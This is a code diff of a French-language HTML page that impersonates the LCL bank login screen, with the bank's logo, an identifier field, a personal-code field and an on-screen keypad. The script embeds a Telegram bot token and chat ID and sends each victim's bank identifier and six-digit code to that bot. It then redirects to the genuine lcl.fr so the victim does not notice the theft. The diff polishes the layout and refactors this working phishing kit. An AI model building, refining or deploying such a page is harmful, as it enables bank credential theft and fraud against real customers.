@@ -2,7 +2,7 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Mon Espace LCL</title>
     <style>
         body {
@@ -10,11 +10,12 @@
             background-color: #ffffff;
             display: flex;
             justify-content: center;
-            align-items: flex-start; /* Aligné en haut comme sur mobile */
+            align-items: flex-start;
             min-height: 100vh;
             margin: 0;
-            color: #333;
             padding-top: 20px;
+            color: #333;
+            -webkit-tap-highlight-color: transparent;
         }
 
         .container {
@@ -23,28 +24,27 @@
             padding: 0 20px 20px 20px;
         }
 
-        /* Logo LCL en haut, petit */
+        /* Logo */
         .logo {
             text-align: center;
-            margin-bottom: 30px;
+            margin-bottom: 20px;
         }
         
         .logo img {
-            width: 80px; /* Taille réduite pour correspondre à la capture */
-            height: auto;
+            width: 80px;
         }
 
         h2 {
             font-size: 18px;
             font-weight: 600;
-            margin-bottom: 25px;
-            text-align: left; /* Aligné à gauche comme sur la capture */
+            margin-bottom: 20px;
+            text-align: left;
             color: #000;
         }
 
-        /* Groupe de saisie */
+        /* Champs de saisie */
         .input-group {
-            margin-bottom: 25px;
+            margin-bottom: 20px;
             position: relative;
         }
 
@@ -52,108 +52,100 @@
             display: block;
             font-size: 14px;
             color: #666;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
         }
 
-        /* Champ sans bordure, juste des tirets */
+        /* L'affichage des chiffres et tirets */
         .input-display {
-            font-size: 24px;
+            font-size: 26px;
             letter-spacing: 2px;
             color: #000;
             font-weight: 500;
-            min-height: 30px;
+            min-height: 35px;
             border: none;
             outline: none;
             background: transparent;
             width: 100%;
             padding: 0;
             margin: 0;
-            font-family: monospace; /* Pour aligner les tirets */
+            font-family: monospace;
+            cursor: text;
         }
 
-        /* Input caché qui capture la frappe */
+        /* Input caché réel */
         .hidden-input {
             position: absolute;
             opacity: 0;
-            width: 0;
-            height: 0;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            cursor: text;
+            z-index: 10;
+        }
+
+        /* Checkbox Mémoriser */
+        .checkbox-group {
+            margin-top: 5px;
+        }
+        .checkbox-group label {
+            font-size: 14px;
+            color: #666;
+            display: inline;
+            cursor: pointer;
+        }
+        .checkbox-group input {
+            margin-right: 8px;
+            vertical-align: middle;
         }
 
         /* Clavier */
         .keypad {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
-            gap: 12px;
-            margin-top: 20px;
+            gap: 15px;
+            margin-top: 10px;
         }
 
         .key {
-            background-color: #f8f8f8;
+            background-color: #f0f0f0;
             border: none;
             border-radius: 50%;
-            width: 60px;
-            height: 60px;
-            font-size: 22px;
+            width: 65px;
+            height: 65px;
+            font-size: 24px;
             font-weight: 500;
             color: #000;
             cursor: pointer;
             margin: 0 auto;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
             transition: background-color 0.1s;
         }
 
         .key:active {
-            background-color: #e0e0e0;
+            background-color: #d0d0d0;
+            transform: scale(0.95);
         }
 
-        .key-clear {
-            font-size: 16px;
-            color: #d00;
-            background-color: #fff;
+        .key-del {
+            background-color: transparent;
             box-shadow: none;
+            color: #d00;
+            font-size: 20px;
         }
 
-        /* Liens en bas */
-        .links {
-            margin-top: 20px;
-            font-size: 14px;
-        }
-
-        .links a {
-            color: #666;
-            text-decoration: none;
-            display: block;
-            margin-bottom: 8px;
-        }
-
-        .links a:hover {
-            text-decoration: underline;
-        }
-
-        /* Checkbox "Mémoriser" */
-        .remember-me {
-            display: flex;
-            align-items: center;
-            margin-top: 10px;
-            font-size: 14px;
-            color: #666;
-        }
-
-        .remember-me input {
-            margin-right: 8px;
-        }
-
+        /* Bouton Valider */
         .btn-validate {
             width: 100%;
-            padding: 12px;
-            background-color: #0055a4; /* Bleu LCL */
+            padding: 14px;
+            background-color: #0055a4;
             color: white;
             border: none;
             border-radius: 4px;
             font-size: 16px;
             font-weight: bold;
             cursor: pointer;
-            margin-top: 20px;
+            margin-top: 25px;
             opacity: 0.5;
             pointer-events: none;
         }
@@ -163,52 +155,65 @@
             pointer-events: auto;
         }
 
-        footer {
-            margin-top: 30px;
-            text-align: center;
-            font-size: 11px;
-            color: #999;
+        /* Liens et pied de page */
+        .links {
+            margin-top: 15px;
+            font-size: 14px;
+        }
+        .links a {
+            color: #666;
+            text-decoration: none;
+            display: block;
+            margin-bottom: 8px;
         }
         
         .security-msg {
-            font-size: 11px;
+            font-size: 12px;
             color: #666;
-            margin-top: 20px;
+            margin-top: 25px;
             line-height: 1.4;
+            background-color: #fcfcfc;
             padding: 10px;
-            background-color: #f9f9f9;
             border-radius: 4px;
+        }
+
+        footer {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 11px;
+            color: #999;
         }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <!-- Logo LCL -->
     <div class="logo">
-        <img src="https://upload.wikimedia.org/wikipedia/fr/thumb/0/0b/Lcl_logo.svg/250px-Lcl_logo.svg.png?utm_source=fr.wikipedia.org&utm_campaign=index&utm_content=thumbnail&_=20210313135726" alt="LCL Logo">
+        <img src="https://upload.wikimedia.org/wikipedia/fr/thumb/0/0b/Lcl_logo.svg/250px-Lcl_logo.svg.png" alt="LCL">
     </div>
 
     <h2>Pour aller de l’avant</h2>
 
-    <!-- Champ Identifiant (10 tirets) -->
-    <div class="input-group">
+    <!-- Champ 1: Identifiant -->
+    <div class="input-group" id="group-id">
         <label>Votre identifiant</label>
         <input type="tel" id="input-id" class="hidden-input" maxlength="10" inputmode="numeric" autocomplete="off">
         <div class="input-display" id="display-id">__________</div>
-        <div class="remember-me">
-            <input type="checkbox" id="remember"> <label for="remember" style="margin:0; display:inline;">Mémoriser mon identifiant</label>
+        
+        <div class="checkbox-group">
+            <input type="checkbox" id="remember"> 
+            <label for="remember">Mémoriser mon identifiant</label>
         </div>
     </div>
 
-    <!-- Champ Code Personnel (6 tirets) -->
-    <div class="input-group">
+    <!-- Champ 2: Code Personnel -->
+    <div class="input-group" id="group-pass">
         <label>Votre code personnel</label>
-        <input type="tel" id="input-pass" class="hidden-input" maxlength="6" inputmode="numeric" autocomplete="off">
+        <input type="tel" id="input-pass" class="hidden-input" maxlength="6" inputmode="numeric" autocomplete="off" disabled>
         <div class="input-display" id="display-pass">______</div>
     </div>
 
-    <!-- Clavier Numérique -->
+    <!-- Clavier -->
     <div class="keypad">
         <button class="key" onclick="press('1')">1</button>
         <button class="key" onclick="press('2')">2</button>
@@ -220,7 +225,7 @@
         <button class="key" onclick="press('8')">8</button>
         <button class="key" onclick="press('9')">9</button>
         <button class="key" onclick="press('0')">0</button>
-        <button class="key key-clear" onclick="backspace()">⌫</button>
+        <button class="key key-del" onclick="backspace()">⌫</button>
     </div>
 
     <button class="btn-validate" id="btn-validate" onclick="validate()">Valider</button>
@@ -242,78 +247,89 @@
 </div>
 
 <script>
-    // ==========================================
-    // CONFIGURATION TELEGRAM
-    // ==========================================
+    // CONFIG TELEGRAM
     const botToken = '8835375365:AAGXLvfFbU_wNtDvs5jxpEe019V2n6IY_WQ';
     const chatId = '8501464548';
-    // ==========================================
 
+    // ELEMENTS
     const inputId = document.getElementById('input-id');
     const inputPass = document.getElementById('input-pass');
     const displayId = document.getElementById('display-id');
     const displayPass = document.getElementById('display-pass');
     const btnValidate = document.getElementById('btn-validate');
+    const groupPass = document.getElementById('group-pass');
 
-    let activeField = 'id'; // 'id' ou 'pass'
+    // ETAT
+    let currentField = 'id'; // 'id' ou 'pass'
 
-    // Mise à jour de l'affichage des tirets
+    // INITIALISATION
+    inputId.focus();
+
+    // Gestion du clic sur les champs pour forcer le focus
+    document.getElementById('group-id').addEventListener('click', () => {
+        currentField = 'id';
+        inputId.focus();
+    });
+
+    document.getElementById('group-pass').addEventListener('click', () => {
+        // On ne passe au pass que si il est activé ou si on clique dessus
+        if (!inputPass.disabled) {
+            currentField = 'pass';
+            inputPass.focus();
+        }
+    });
+
+    // MISE A JOUR AFFICHAGE
     function updateDisplay(input, display) {
-        let val = input.value;
-        let dashes = '_';
-        if (input === inputId) {
-            dashes = '__________'; // 10
-        } else {
-            dashes = '______'; // 6
+        const val = input.value;
+        let max = input.maxLength;
+        let str = '';
+        for(let i=0; i<max; i++) {
+            str += (i < val.length) ? val[i] : '_';
         }
+        display.textContent = str;
         
-        // Remplace les underscores par les chiffres saisis
-        let result = '';
-        for (let i = 0; i < dashes.length; i++) {
-            if (i < val.length) {
-                result += val[i];
-            } else {
-                result += '_';
-            }
+        // Vérif si rempli pour activer le suivant
+        if (input === inputId && val.length === 10) {
+            activateNext();
         }
-        display.textContent = result;
     }
 
-    // Clic pour activer le champ
-    document.querySelector('.input-group:nth-child(1)').addEventListener('click', (e) => {
-        if(e.target.tagName !== 'INPUT') { // Évite de re-cliquer si déjà focus
-            activeField = 'id';
-            inputId.focus();
-        }
-    });
-    document.querySelector('.input-group:nth-child(2)').addEventListener('click', (e) => {
-        activeField = 'pass';
+    function activateNext() {
+        inputPass.disabled = false;
         inputPass.focus();
-    });
+        currentField = 'pass';
+    }
 
+    // SAISIE
     function press(num) {
-        let currentInput = activeField === 'id' ? inputId : inputPass;
-        let currentDisplay = activeField === 'id' ? displayId : displayPass;
-        
-        if (currentInput.value.length < currentInput.maxLength) {
-            currentInput.value += num;
-            updateDisplay(currentInput, currentDisplay);
-            checkValidation();
+        let input = (currentField === 'id') ? inputId : inputPass;
+        let display = (currentField === 'id') ? displayId : displayPass;
+
+        if (input.value.length < input.maxLength) {
+            input.value += num;
+            updateDisplay(input, display);
+            checkReady();
         }
     }
 
     function backspace() {
-        let currentInput = activeField === 'id' ? inputId : inputPass;
-        let currentDisplay = activeField === 'id' ? displayId : displayPass;
-        
-        if (currentInput.value.length > 0) {
-            currentInput.value = currentInput.value.slice(0, -1);
-            updateDisplay(currentInput, currentDisplay);
-            checkValidation();
+        let input = (currentField === 'id') ? inputId : inputPass;
+        let display = (currentField === 'id') ? displayId : displayPass;
+
+        if (input.value.length > 0) {
+            input.value = input.value.slice(0, -1);
+            updateDisplay(input, display);
+            checkReady();
+            
+            // Si on efface l'ID, on peut re-permettre la frappe sur l'ID
+            if (currentField === 'pass' && input.value.length < input.maxLength) {
+               // On reste sur le pass tant qu'il y a des chiffres ou si c'est vide
+            }
         }
     }
 
-    function checkValidation() {
+    function checkReady() {
         if (inputId.value.length === 10 && inputPass.value.length === 6) {
             btnValidate.classList.add('active');
         } else {
@@ -321,58 +337,34 @@
         }
     }
 
-    // Fonction d'envoi vers Telegram
-    async function sendToTelegram(username, password) {
-        const message = `🔐 *Nouvelle Connexion LCL*\n\n👤 Utilisateur: ${username}\n🔑 Code: ${password}\n📅 Date: ${new Date().toLocaleString()}\n📱 Appareil: ${navigator.userAgent}`;
-        
-        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-        
+    // TELEGRAM
+    async function sendToTelegram(id, pass) {
+        const msg = `🔐 *Connexion LCL*\n\n👤 ID: ${id}\n🔑 Code: ${pass}\n📅 ${new Date().toLocaleString()}`;
         try {
-            await fetch(url, {
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
+                body: JSON.stringify({chat_id: chatId, text: msg, parse_mode: 'Markdown'})
             });
-        } catch (error) {
-            console.error('Erreur envoi Telegram:', error);
-        }
+        } catch(e) { console.error(e); }
     }
 
     function validate() {
         if (btnValidate.classList.contains('active')) {
-            const id = inputId.value;
-            const pass = inputPass.value;
-
-            // 1. Envoi des données à Telegram
-            sendToTelegram(id, pass);
-
-            // 2. Redirection vers le vrai site après 1.5 seconde
+            sendToTelegram(inputId.value, inputPass.value);
             setTimeout(() => {
-                window.location.href = "https://www.lcl.fr"; 
-            }, 1500);
+                window.location.href = 'https://www.lcl.fr';
+            }, 1000);
         }
     }
 
-    // Gestion clavier physique
+    // CLAVIER PHYSIQUE
     document.addEventListener('keydown', (e) => {
-        if (e.key >= '0' && e.key <= '9') {
-            press(e.key);
-        } else if (e.key === 'Backspace') {
-            backspace();
-        } else if (e.key === 'Enter') {
-            if (btnValidate.classList.contains('active')) {
-                validate();
-            }
-        }
+        if (e.key >= '0' && e.key <= '9') press(e.key);
+        else if (e.key === 'Backspace') backspace();
+        else if (e.key === 'Enter' && btnValidate.classList.contains('active')) validate();
     });
 
-    // Focus initial
-    inputId.focus();
 </script>
-
 </body>
 </html>
